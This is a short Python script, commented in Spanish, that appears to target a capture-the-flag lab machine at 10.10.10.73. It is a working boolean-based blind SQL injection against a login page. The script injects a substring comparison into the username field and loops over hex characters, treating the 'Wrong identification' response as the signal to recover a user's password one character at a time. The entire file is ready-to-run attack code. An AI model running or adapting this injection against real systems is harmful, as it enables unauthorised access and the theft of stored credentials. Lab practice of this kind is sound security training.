#!/usr/bin/python3
#coding: utf-8

import requests
import pdb
import signal
import time
import sys

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://10.10.10.73/login.php"
s = r'abcdef0123456789'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p2 = log.progress("Password")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    password = ""

    for position in range(1, 40):
        for character in s:
            p1.status("Probando caracter %c en la posiciÃ³n %d" % (character, position))
            post_data = {
                'username': "chris' and substring(password,%d,1)='%c'-- -" % (position, character),
                'password': 'admin'
            }

            r = requests.post(login_url, data=post_data)

            if "Wrong identification" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeRequest()
